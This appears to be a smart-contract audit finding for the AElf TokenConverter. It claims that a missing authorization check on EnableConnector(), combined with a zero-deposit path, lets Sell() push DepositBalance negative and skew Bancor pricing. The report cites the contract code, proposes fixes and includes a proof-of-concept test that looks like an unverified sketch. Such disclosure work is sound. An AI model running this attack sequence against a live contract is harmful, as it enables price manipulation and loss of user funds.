# Audit Report

## Title
Negative DepositBalance Corruption via Zero-Deposit Connector Enablement

## Summary
The `EnableConnector()` function lacks authorization checks and allows connectors to be enabled with zero initial deposit balance, creating an accounting vulnerability where subsequent `Sell()` operations drive `DepositBalance` negative, permanently corrupting Bancor pricing calculations and enabling price manipulation attacks.

## Finding Description

The vulnerability exists across three critical control failures in the TokenConverter contract:

**1. Missing Authorization Control**

The `EnableConnector()` function has no authorization check, unlike other connector management functions (`AddPairConnector`, `UpdateConnector`, `SetFeeRate`). Any user can call this function once a connector pair has been added by the controller. [1](#0-0) 

**2. Zero-Deposit Initialization**

When `GetNeededDeposit()` returns `NeedAmount = 0` (which occurs when the contract already holds sufficient resource tokens), the function directly sets `State.DepositBalance[toConnector.Symbol] = 0` without validation. [2](#0-1) 

The calculation in `GetNeededDeposit()` returns zero when `totalSupply - contractBalance - AmountToTokenConvert <= 0`: [3](#0-2) 

**3. Unconditional DepositBalance Decrement**

The `Sell()` function unconditionally decrements `DepositBalance` without checking sufficiency. When a user sells resource tokens, the function calculates `amountToReceive`, transfers base tokens from the contract's actual balance, then decrements `DepositBalance`: [4](#0-3) 

The `Sub()` operation uses checked arithmetic to prevent overflow but **does not prevent negative results** for signed long types. When `DepositBalance = 0` and `amountToReceive > 0`, the result is a negative value.

**4. Corrupted Balance Used in Pricing**

The corrupted `DepositBalance` is then used in all future pricing calculations via `GetSelfBalance()`. For deposit connectors with virtual balance enabled (which is always true for connectors created via `AddPairConnector`), the function returns the sum of virtual and real balance: [5](#0-4) [6](#0-5) 

When `DepositBalance` is negative, `GetSelfBalance` returns `VirtualBalance + (negative amount)`, reducing the effective balance used in Bancor formulas.

**5. Bancor Validates Only at Call Time**

The Bancor helper functions validate that connector balances are positive at calculation time, but they cannot prevent `DepositBalance` from becoming negative after a successful operation: [7](#0-6) [8](#0-7) 

## Impact Explanation

This vulnerability has **HIGH severity** impact:

1. **Permanent State Corruption**: Once `DepositBalance` becomes negative, it remains corrupted indefinitely, affecting all future operations on that connector pair.

2. **Price Manipulation**: The reduced effective balance in Bancor calculations causes mispricing. Attackers can exploit this to:
   - Buy resource tokens at artificially low prices
   - Sell resource tokens at artificially high prices
   - Extract value from the protocol through asymmetric arbitrage

3. **Cross-Connector Contagion**: If multiple connectors share the same base token pool, negative accounting in one connector drains funds intended for others.

4. **Invariant Violation**: The Bancor model fundamentally requires positive connector balances. Negative balances violate this core invariant and produce undefined economic behavior.

**Affected Parties:**
- Protocol treasury loses value through mispriced swaps
- Legitimate users receive incorrect prices on subsequent trades
- Other connector pairs face reserve depletion if base tokens are shared

## Likelihood Explanation

This vulnerability has **HIGH likelihood** of exploitation:

1. **No Authorization Required**: Any user can call `EnableConnector()` - there is no `AssertPerformedByConnectorController()` check, unlike other connector management functions.

2. **Realistic Preconditions**: 
   - New connectors are regularly added to existing TokenConverter instances
   - Contracts commonly hold resource tokens from fees, initial distributions, or other connectors
   - Base tokens exist in the contract from multiple sources (other connector pairs, fee collections, treasury operations)

3. **Low Attack Complexity**: The attack sequence is straightforward:
   - Wait for controller to add a new connector pair via `AddPairConnector()`
   - Call `EnableConnector()` with parameters that result in `needDeposit = 0`
   - Call `Sell()` to trigger negative `DepositBalance`
   - All future operations use corrupted pricing

4. **Natural Occurrence**: The vulnerability will trigger naturally (without malicious intent) when:
   - Connectors are added to systems with pre-existing token distributions
   - Normal trading creates sell pressure on newly enabled connectors
   - Multiple connectors share base token reserves

## Recommendation

**Primary Fix**: Add authorization check to `EnableConnector()`:

```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    AssertPerformedByConnectorController(); // ADD THIS
    var fromConnector = State.Connectors[input.TokenSymbol];
    // ... rest of function
}
```

**Secondary Fix**: Validate that `needDeposit.NeedAmount > 0` or add minimum deposit requirement:

```csharp
var needDeposit = GetNeededDeposit(input);
Assert(needDeposit.NeedAmount > 0, "Connector must have initial deposit");
```

**Tertiary Fix**: Add validation in `Sell()` to prevent negative `DepositBalance`:

```csharp
var currentBalance = State.DepositBalance[toConnector.Symbol];
Assert(currentBalance >= amountToReceive, "Insufficient deposit balance");
State.DepositBalance[toConnector.Symbol] = currentBalance.Sub(amountToReceive);
```

## Proof of Concept

```csharp
[Fact]
public async Task NegativeDepositBalance_Via_ZeroDepositConnector_Test()
{
    // Setup: Create and add connector pair
    var tokenSymbol = "VULN";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol); // Requires Parliament approval
    
    // Precondition: Transfer most resource tokens to converter contract
    var totalSupply = 1_000_000_000;
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = totalSupply,
        To = TokenConverterContractAddress, // Contract holds all tokens
        Symbol = tokenSymbol
    });
    
    // Verify GetNeededDeposit returns 0
    var needDeposit = await DefaultStub.GetNeededDeposit.CallAsync(
        new ToBeConnectedTokenInfo
        {
            TokenSymbol = tokenSymbol,
            AmountToTokenConvert = 0
        });
    needDeposit.NeedAmount.ShouldBe(0); // Zero deposit required
    
    // Exploit: Any user calls EnableConnector (no authorization check!)
    await DefaultStub.EnableConnector.SendAsync(
        new ToBeConnectedTokenInfo
        {
            TokenSymbol = tokenSymbol,
            AmountToTokenConvert = 0
        });
    
    // Verify DepositBalance is 0
    var depositConnectorSymbol = "(NT)" + tokenSymbol;
    var depositBalance = State.DepositBalance[depositConnectorSymbol];
    depositBalance.ShouldBe(0);
    
    // Trigger: User sells tokens (contract has base tokens from other sources)
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Symbol = tokenSymbol,
        Spender = TokenConverterContractAddress,
        Amount = 1000
    });
    
    await DefaultStub.Sell.SendAsync(new SellInput
    {
        Symbol = tokenSymbol,
        Amount = 1000
    });
    
    // Verify: DepositBalance is now NEGATIVE
    var corruptedBalance = State.DepositBalance[depositConnectorSymbol];
    corruptedBalance.ShouldBeLessThan(0); // NEGATIVE - accounting corrupted!
    
    // Impact: Future GetSelfBalance returns reduced value
    var connector = State.Connectors[depositConnectorSymbol];
    var effectiveBalance = connector.VirtualBalance + corruptedBalance;
    effectiveBalance.ShouldBeLessThan(connector.VirtualBalance); // Reduced balance
}
```

## Notes

The root cause is the combination of three design flaws:
1. Missing authorization on `EnableConnector()` 
2. Allowing zero initial deposit when contract holds tokens
3. No validation preventing negative `DepositBalance` in `Sell()`

The vulnerability permanently corrupts connector accounting and violates the Bancor invariant that connector balances must be positive. The fact that `EnableConnector()` lacks authorization (unlike all other connector management functions) means any user can trigger this state corruption, making this a critical access control failure combined with an accounting integrity violation.

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L96-105)
```csharp
        var nativeTokenToResourceConnector = new Connector
        {
            Symbol = nativeConnectorSymbol,
            VirtualBalance = input.NativeVirtualBalance,
            IsVirtualBalanceEnabled = true,
            IsPurchaseEnabled = false,
            RelatedSymbol = input.ResourceConnectorSymbol,
            Weight = input.NativeWeight,
            IsDepositAccount = true
        };
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L186-194)
```csharp
        State.TokenContract.Transfer.Send(
            new TransferInput
            {
                Symbol = State.BaseTokenSymbol.Value,
                To = Context.Sender,
                Amount = amountToReceive
            });
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-84)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```

**File:** contract/AElf.Contracts.TokenConverter/BancorHelper.cs (L37-38)
```csharp
        if (fromConnectorBalance <= 0 || toConnectorBalance <= 0)
            throw new InvalidValueException("Connector balance needs to be a positive number.");
```

**File:** contract/AElf.Contracts.TokenConverter/BancorHelper.cs (L70-71)
```csharp
        if (fromConnectorBalance <= 0 || toConnectorBalance <= 0)
            throw new InvalidValueException("Connector balance needs to be a positive number.");
```
